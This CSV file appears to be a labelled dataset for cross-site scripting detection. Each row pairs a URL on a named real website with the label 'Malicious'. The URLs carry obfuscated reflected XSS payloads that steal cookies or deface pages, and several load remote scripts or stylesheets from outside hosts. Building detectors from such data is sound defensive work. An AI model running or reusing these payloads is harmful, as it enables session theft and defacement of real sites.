Payloads,Class
http://www.stennis.gov/cnlib/pub/site_error_page.htm?site_id=stennis&amp;error=%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert`documen<br<!--Comment-->><br<!--Comment-->>t.cookie`%3c/script<!--Comment-->%3e%3c<!--Comment-->/script%3e,Malicious
http://www.toyota.com.pa/dealers/index.asp?formid=0&amp;searchvalue=&quot;&gt;&lt;script<!--Comment-->&gt;&lt;<!--Comment-->script&gt;alert`&quot;bluemax-grayhatz.or<br<!--Comment-->><br<!--Comment-->>g&quot;`&lt;/script<!--Comment-->&gt;&lt;<!--Comment-->/script&gt;,Malicious
http://www.rentabiliweb.com/fr/contact.php?type=%22%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert%283443%29%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e,Malicious
http://www2.maildomain.web.de/extern/checkdomain/?si=4vbt.1k7cg7.3bl6pg.1g**&amp;wunschdomain=%22%3e%3cm<br<!--Comment-->>arquee%3e%3cm<br<!--Comment-->>arquee%3e%3c<!--Comment-->m<br>arquee%3e%3c<!--Comment-->m<br>arquee%3edefaced%20by%20sponsfull%3c<!--Comment-->/marquee%3e%3c<!--Comment-->/marquee%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e&amp;tld=,Malicious
http://www.careerminded.com/default.php?id=108%22%3e%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<br<!--Comment-->><br<!--Comment-->>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%<br<!--Comment-->><br<!--Comment-->>20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2<br<!--Comment-->><br<!--Comment-->>0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<br<!--Comment-->><br<!--Comment-->>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%<br<!--Comment-->><br<!--Comment-->>20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2<br<!--Comment-->><br<!--Comment-->>0%20%20%20%20%20%20%20%20%3cscript%20src=http://lupbot.comule.com/asu_abangjs.js<!--Comment-->%3e%3cscript%20src=http://lupbot.comule.com/asu_abangjs.js<!--Comment-->%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%20%<br<!--Comment-->><br<!--Comment-->>20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2<br<!--Comment-->><br<!--Comment-->>0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<br<!--Comment-->><br<!--Comment-->>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%<br<!--Comment-->><br<!--Comment-->>20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2<br<!--Comment-->><br<!--Comment-->>0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<br<!--Comment-->><br<!--Comment-->>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3cscript%<br>3ealert%28%22xss%20detected%20xcode%20exploit%20scanner%22%29%3c/script<!--Comment-->%3e%3cscript%<br<!--Comment-->>3ealert%28%22xss%20detected%20xcode%20exploit%20scanner%22%29%3c/script%3e,Malicious
http://www.petsarewelcome.co.uk/scripts/gallery/login.asp?folder=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;alert`document.cookie`&lt;/s<br<!--Comment-->>cript&gt;&lt;/s<br<!--Comment-->>cript&gt;&gt;&lt;<!--Comment-->marquee&gt;&lt;marquee<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;by+narcoticxs&lt;/h1<!--Comment-->&gt;&lt;<!--Comment-->/h1&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;,Malicious
http://www.aceleindir.com/search.php?q=%22%3e%3c<!--Comment-->link%20href=http://starext.by.ru/css.css%20type=text<br>/css%20rel=stylesheet%3e%3c<!--Comment-->link%20href=http://starext.by.ru/css.css%20type=text<br>/css%20rel=stylesheet%3e%3clink%20href=http://starext.by.ru/css.css%20type=text<br>/css%20rel=stylesheet<!--Comment-->%3e%3clink%20href=http://starext.by.ru/css.css%20type=text<br>/css%20rel=stylesheet<!--Comment-->%3e,Malicious
http://www.dgbfb.de/index.php?page=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;alert`document.cookie`&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&gt;&lt;marquee<!--Comment-->&gt;&lt;<!--Comment-->marquee&gt;&lt;h1<!--Comment-->&gt;&lt;<!--Comment-->h1&gt;backdoor&lt;/<br>h1<!--Comment-->&gt;&lt;/<br<!--Comment-->>h1&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;,Malicious
http://www.sia.aviation-civile.gouv.fr/asp/texteregle/recherche.asp?langu=fr?texte=%22%3e%27%3e%3c<!--Comment-->sc<br>ript+src%3dhttp%3a%2f%2fvuln.xssed.net%2fthirdparty%2fscripts%2fpython5.js%3e%3csc<br>ript+src%3dhttp%3a%2f%2fvuln.xssed.net%2fthirdparty%2fscripts%2fpython5.js<!--Comment-->%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e&amp;oucherc<br<!--Comment-->><br<!--Comment-->>her=titre&amp;ordre_0=0&amp;submit=ok,Malicious
http://www.extasycams.com/index.php?lang=eng&amp;ssid=&amp;wbid=&amp;refid=extasycams.com&amp;mref=&amp;submit=modelinfo<br<!--Comment-->><br<!--Comment-->>&amp;id=6908&amp;modelname=passiosex&quot;&gt;&lt;script<!--Comment-->&gt;&lt;<!--Comment-->script&gt;alert`document.cookie`;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;,Malicious
